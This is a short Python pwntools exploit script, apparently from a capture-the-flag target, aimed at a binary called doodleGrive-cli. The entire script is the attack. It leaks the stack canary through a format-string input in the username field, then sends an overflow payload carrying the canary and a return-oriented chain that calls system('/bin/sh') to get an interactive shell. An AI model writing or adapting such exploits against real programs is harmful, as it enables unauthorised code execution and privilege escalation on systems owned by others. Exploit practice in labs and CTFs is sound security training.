#!/usr/bin/python3
from pwn import process, p64

shell = process("./doodleGrive-cli")
shell.sendlineafter(b"Username:\n", b"%15$p")

shell.recvuntil(b"password for ")
canary = p64(int(shell.recvline()[:-2], 16))

pop_rdi = p64(0x401912)
bin_sh = p64(0x497cd5)
system = p64(0x4119d0)
ret = p64(0x40101a)

payload  = b""
payload += b"A" * 56
payload += canary
payload += b"B" * 8
payload += pop_rdi + bin_sh
payload += ret
payload += system

shell.sendline(payload)
shell.sendlineafter(b"\n", b"export PATH=/bin")
shell.interactive()
